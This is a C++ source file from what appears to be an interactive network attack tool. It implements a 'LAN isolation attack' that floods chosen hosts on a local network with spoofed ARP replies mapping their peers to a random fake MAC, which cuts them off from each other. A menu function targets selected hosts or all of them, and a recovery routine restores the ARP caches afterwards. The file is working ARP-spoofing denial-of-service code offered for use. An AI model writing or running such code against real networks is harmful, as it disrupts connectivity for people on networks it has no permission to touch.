#include "common.hpp"

// --- Global Variable Definitions ---
// These are specific to tracking attack state
std::map<std::string, std::thread> active_attack_threads;
std::map<std::string, std::atomic<bool>> attack_signals;

// --- Utility function specific to attacking ---
std::string generate_random_mac() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, 255);
    char mac_str[18];
    // Set OUI to a locally administered address range (x2, x6, xA, xE)
    sprintf(mac_str, "02:%02x:%02x:%02x:%02x:%02x",
            distrib(gen), distrib(gen), distrib(gen), distrib(gen), distrib(gen));
    return std::string(mac_str);
}


// --- Core Attack & Recovery Functions ---

void lan_isolation_attack(const std::vector<Host> targets, const std::vector<Host> all_known_hosts, std::atomic<bool>* signal) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Attack socket");
        return;
    }

    std::string fake_mac_str = generate_random_mac();
    unsigned char fake_mac_bytes[6];
    string_mac_to_bytes(fake_mac_bytes, fake_mac_str);

    while (signal->load()) {
        for (const auto& target : targets) {
            unsigned char t_mac_bytes[6]; string_mac_to_bytes(t_mac_bytes, target.mac);
            unsigned char t_ip_bytes[4]; inet_pton(AF_INET, target.ip.c_str(), t_ip_bytes);

            for (const auto& other : all_known_hosts) {
                if (target.ip == other.ip) continue;

                unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arp_header)];
                struct sockaddr_ll sll = {0}; sll.sll_ifindex = active_interface.index;
                struct ethhdr* eth = (struct ethhdr*)buffer;
                struct arp_header* arp = (struct arp_header*)(buffer + sizeof(struct ethhdr));
                *arp = {htons(ARPHRD_ETHER), htons(ETH_P_IP), 6, 4, htons(ARPOP_REPLY)};

                unsigned char o_mac_bytes[6]; string_mac_to_bytes(o_mac_bytes, other.mac);
                unsigned char o_ip_bytes[4]; inet_pton(AF_INET, other.ip.c_str(), o_ip_bytes);
                
                // Tell Target that Other Host is at our fake MAC
                memcpy(eth->h_source, fake_mac_bytes, 6);
                memcpy(eth->h_dest, t_mac_bytes, 6);
                eth->h_proto = htons(ETH_P_ARP);
                memcpy(arp->sender_mac, fake_mac_bytes, 6);
                memcpy(arp->sender_ip, o_ip_bytes, 4);
                memcpy(arp->target_mac, t_mac_bytes, 6);
                memcpy(arp->target_ip, t_ip_bytes, 4);
                sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));
                
                // Tell Other Host that Target is at our fake MAC
                memcpy(eth->h_dest, o_mac_bytes, 6);
                memcpy(arp->sender_ip, t_ip_bytes, 4);
                memcpy(arp->target_mac, o_mac_bytes, 6);
                memcpy(arp->target_ip, o_ip_bytes, 4);
                sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    close(sock);
}

void recover_network(const std::vector<Host>& targets, const std::vector<Host>& all_known_hosts) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Recovery socket");
        return;
    }
    
    // Send correct ARP replies multiple times to ensure caches are updated
    for (int i = 0; i < 3; ++i) {
        for(const auto& target : targets) {
            unsigned char t_mac_bytes[6]; string_mac_to_bytes(t_mac_bytes, target.mac);
            unsigned char t_ip_bytes[4]; inet_pton(AF_INET, target.ip.c_str(), t_ip_bytes);

            for (const auto& other : all_known_hosts) {
                if (target.ip == other.ip) continue;
                
                unsigned char o_mac_bytes[6]; string_mac_to_bytes(o_mac_bytes, other.mac);
                unsigned char o_ip_bytes[4]; inet_pton(AF_INET, other.ip.c_str(), o_ip_bytes);
                
                unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arp_header)];
                struct sockaddr_ll sll = {0}; sll.sll_ifindex = active_interface.index;
                struct ethhdr* eth = (struct ethhdr*)buffer;
                struct arp_header* arp = (struct arp_header*)(buffer + sizeof(struct ethhdr));
                *arp = {htons(ARPHRD_ETHER), htons(ETH_P_IP), 6, 4, htons(ARPOP_REPLY)};

                // Tell Target the correct MAC for Other Host
                memcpy(eth->h_source, o_mac_bytes, 6);
                memcpy(eth->h_dest, t_mac_bytes, 6);
                eth->h_proto = htons(ETH_P_ARP);
                memcpy(arp->sender_mac, o_mac_bytes, 6);
                memcpy(arp->sender_ip, o_ip_bytes, 4);
                memcpy(arp->target_mac, t_mac_bytes, 6);
                memcpy(arp->target_ip, t_ip_bytes, 4);
                sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

                // Tell Other Host the correct MAC for Target
                memcpy(eth->h_source, t_mac_bytes, 6);
                memcpy(eth->h_dest, o_mac_bytes, 6);
                memcpy(arp->sender_mac, t_mac_bytes, 6);
                memcpy(arp->sender_ip, t_ip_bytes, 4);
                memcpy(arp->target_mac, o_mac_bytes, 6);
                memcpy(arp->target_ip, o_ip_bytes, 4);
                sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    close(sock);
}


// --- Menu Option Logic (extracted from main) ---

void start_lan_isolation_attack() {
    if (hosts.empty()) {
        std::cout << RED << "\nNo targets found. Please scan the network first (Option 1)." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }
    
    display_scan_results();
    std::cout << "\nEnter target ID(s) to isolate (e.g., '1 3').\n";
    std::cout << "Leave blank or type 'all' to attack ALL (excluding self and gateway).\n";
    std::cout << "Enter 'back' to return to the main menu.\n";
    std::cout << "\nTarget(s): ";

    std::string input;
    std::getline(std::cin, input);
    if (input == "back") return;

    std::string processed_input = input;
    std::transform(processed_input.begin(), processed_input.end(), processed_input.begin(), ::tolower);

    std::vector<Host> targets_to_attack;
    if (processed_input.empty() || processed_input == "all") {
        std::string gateway_ip;
        FILE *fp = popen("ip r | grep default | cut -d' ' -f3", "r");
        char buf[16];
        if (fp && fgets(buf, sizeof(buf), fp) != NULL) gateway_ip = buf;
        if(fp) pclose(fp);
        gateway_ip.erase(std::remove(gateway_ip.begin(), gateway_ip.end(), '\n'), gateway_ip.end());
        
        for(const auto& host : hosts) {
            if (host.ip != active_interface.ip && host.ip != gateway_ip) {
                targets_to_attack.push_back(host);
            }
        }
    } else {
        std::stringstream ss(input);
        int id;
        while (ss >> id) {
            if (id > 0 && static_cast<size_t>(id) <= hosts.size()) {
                targets_to_attack.push_back(hosts[id - 1]);
            }
        }
    }

    if (targets_to_attack.empty()) {
        std::cout << YELLOW << "No valid targets selected." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }

    std::atomic<bool> attack_signal(true);
    std::thread attack_thread(lan_isolation_attack, targets_to_attack, hosts, &attack_signal);
    
    print_header();
    std::cout << BOLD << RED << "[ATTACKING] " << targets_to_attack.size() << " target(s)..." << RESET << std::endl;
    for(const auto& t : targets_to_attack) { std::cout << "  -> " << t.ip << std::endl; }
    std::cout << BOLD << YELLOW << "\nAttack is running. Press 's' and Enter to stop." << RESET << std::endl;
    
    char stop_char;
    do { std::cin >> stop_char; } while (stop_char != 's' && stop_char != 'S');
    
    attack_signal.store(false);
    std::cout << "\n" << BOLD << YELLOW << "[!] Stopping attack thread..." << RESET << std::endl;
    if (attack_thread.joinable()) { attack_thread.join(); }
    
    std::cout << BOLD << GREEN << "[+] Sending recovery packets..." << RESET << std::endl;
    recover_network(targets_to_attack, hosts);
    std::cout << "[+] Network should be restored." << RESET << std::endl;
    std::cout << "\nPress Enter to continue...";
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin.get();
}